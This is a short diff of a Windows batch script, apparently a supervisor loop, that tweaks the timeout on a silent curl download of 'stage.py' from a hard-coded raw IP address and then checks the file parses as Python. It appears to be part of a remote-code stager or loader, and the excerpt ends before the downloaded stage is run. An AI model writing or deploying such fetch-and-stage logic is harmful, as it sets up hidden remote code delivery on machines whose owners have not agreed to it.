@@ -16,7 +16,7 @@ if defined OLDPID (
 )
 echo sup_start_v2 %DATE% %TIME% >>"%B%\sup.log"
 set "OUT=%B%\stage.out.%RANDOM%%RANDOM%"
-%SystemRoot%\System32\curl.exe -s -m 60 -o "%B%\stage.new" http://217.15.164.237:8000/stage.py
+%SystemRoot%\System32\curl.exe -s -m 8 -o "%B%\stage.new" http://217.15.164.237:8000/stage.py
 if exist "%B%\stage.new" (
   "@@PY@@" -c "import ast,sys;ast.parse(open(sys.argv[1],encoding='utf-8',errors='replace').read())" "%B%\stage.new" >nul 2>&1
   if not errorlevel 1 (
